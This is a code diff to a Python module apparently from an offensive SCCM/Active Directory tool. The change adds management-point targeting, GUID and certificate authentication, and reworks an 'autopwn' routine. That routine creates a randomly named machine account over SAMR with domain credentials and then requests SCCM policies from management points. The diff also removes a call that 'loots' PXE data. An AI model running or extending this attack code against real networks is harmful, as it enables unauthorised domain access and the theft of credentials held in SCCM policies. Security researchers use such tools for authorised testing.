@@ -16,14 +16,15 @@ import os
 
 class HTTP:
     
-    def __init__(self, username=None, password=None, domain=None, target_dom=None, 
+    def __init__(self, username=None, password=None, domain=None, target_dom=None, mp=None, 
                     dc_ip=None,ldaps=False, kerberos=False, no_pass=False, hashes=None, 
                     aes=None, debug=False, auto=False, computer_pass=None, computer_name=None, 
-                    certificate=None, logs_dir=None):
+                    certificate=None, client_guid=None, media_guid=None, logs_dir=None):
         self.username = username
         self.password = password
         self.domain = domain
         self.target_dom = target_dom
+        self.mp = mp
         self.dc_ip = dc_ip
         self.ldaps = ldaps
         self.kerberos = kerberos
@@ -36,66 +37,79 @@ class HTTP:
         self.auto = auto
         self.computer_name = computer_name
         self.computer_pass = computer_pass
+        self.client_guid = client_guid
+        self.media_guid = media_guid
         self.certificate = certificate
         self.targets = []
         self.logs_dir = logs_dir
 
  
     def run(self):
-        logfile = f"{os.path.expanduser('~')}/.sccmhunter/logs/sccmhunter.log"
-        if os.path.exists(logfile):
-            logger.info("[*] Found targets from logfile.")
-            targets = self.read_logs(logfile)
-            self.targets = self.http_hunter(targets)
+        if self.mp:
+            self.targets.append(self.mp)
             self.autopwn()
         else:
-            logger.info("Log file not found, searching LDAP for site servers.")
-            sccmhunter = SCCMHUNTER(username=self.username, password=self.password, domain=self.domain, 
-                                    target_dom=self.target_dom, dc_ip=self.dc_ip,ldaps=self.ldaps,
-                                    kerberos=self.kerberos, no_pass=self.no_pass, hashes=self.hashes, 
-                                    aes=self.aes, debug=self.debug, logs_dir=self.logs_dir)
-            sccmhunter.run()
-            self.run()
+            logfile = f"{os.path.expanduser('~')}/.sccmhunter/logs/sccmhunter.log"
+            if os.path.exists(logfile):
+                logger.info("[*] Found targets from logfile.")
+                targets = self.read_logs(logfile)
+                self.targets = self.http_hunter(targets)
+                self.autopwn()
+            else:
+                logger.info("Log file not found, searching LDAP for site servers.")
+                sccmhunter = SCCMHUNTER(username=self.username, password=self.password, domain=self.domain, 
+                                        target_dom=self.target_dom, dc_ip=self.dc_ip,ldaps=self.ldaps,
+                                        kerberos=self.kerberos, no_pass=self.no_pass, hashes=self.hashes, 
+                                        aes=self.aes, debug=self.debug, logs_dir=self.logs_dir)
+                sccmhunter.run()
+                self.run()
 
 
     def autopwn(self):
         if self.auto:
-            if not (self.username or self.password):
+            if not (self.username or self.password) and not self.certificate:
                 logger.info("Missing user credentials, check your arguments and try again.")
                 sys.exit()
-            logger.info("[*] User selected auto. Attempting to add a machine account then request policies."
-                        )
-            self.computer_name = f'DESKTOP-' + (''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '$')
-            self.computer_pass = f''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
-            samradd = AddComputerSAMR(self.username, self.password, self.domain, self.hashes, self.aes, self.kerberos, 
-                                   self.dc_ip, self.computer_name, self.computer_pass)
-            samradd.run()
 
-            if self.validate_add(self.computer_name):
-                logger.info(f'[+] {self.computer_name} created with password: {self.computer_pass}')
-            else:
-                logger.info(f'[-] Could not validate successful creation.')
-        
-        if not ((self.computer_name or self.computer_pass) or self.certificate):
-            logger.info("[-] Missing machine account credentials or client authentication certificate, check your arguments and try again.")
-            sys.exit()
+            if (self.username and self.password):
 
-        for target in self.targets:
-            target_name = self.computer_name[:-1]
-            target_fqdn = f'{target_name}.{self.domain}'
+                logger.info("[*] User selected auto. Attempting to add a machine account then request policies.")
+                if not (self.computer_name and self.computer_pass):
+                    self.computer_name = f'DESKTOP-' + (''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '$')
+                    self.computer_pass = f''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
+                    samradd = AddComputerSAMR(self.username, self.password, self.domain, self.hashes, self.aes, self.kerberos, 
+                                        self.dc_ip, self.computer_name, self.computer_pass)
+                    samradd.run()
+
+                    if self.validate_add(self.computer_name):
+                        logger.info(f'[+] {self.computer_name} created with password: {self.computer_pass}')
+                    else:
+                        logger.info(f'[-] Could not validate successful creation.')
+                else:
+                    logger.info("[*] Using supplied machine account credentials")
+            
+            if not ((self.computer_name or self.computer_pass) or self.certificate):
+                logger.info("[-] Missing machine account credentials or client authentication certificate, check your arguments and try again.")
+                sys.exit()
+
+            self.run_sccmwtf()
+
+
+    def run_sccmwtf(self):
+        for mp in self.targets:
+            logger.info(f"[*] Attempting to grab policy from {mp}")
+
             try:
-                logger.info(f"[*] Atempting to grab policy from {target}")
-                SCCMWTF=SCCMTools(target_name, target_fqdn, target, self.computer_name, self.computer_pass, self.logs_dir)
+                if self.computer_name and self.computer_pass:
+                    device_name = self.computer_name[:-1]
+                    device_fqdn = f'{device_name}.{self.domain}'
+                    SCCMWTF=SCCMTools(mp, device_name=device_name, device_fqdn=device_fqdn, machine_username=self.computer_name, machine_password=self.computer_pass, logs_dir=self.logs_dir)
+                else:
+                    SCCMWTF=SCCMTools(mp, client_guid=self.client_guid, media_guid=self.media_guid, certificate=self.certificate)
                 SCCMWTF.sccmwtf_run()
             except Exception as e:
                 print(e)
 
-            try:
-                if (self.certificate):
-                    # do stuff
-                    PXETHIEFY=pxethiefy.loot_ip_address(target_fqdn)
-            except Exception as e:
-                print(e)
 
     def read_logs(self, logfile):
         targets = []
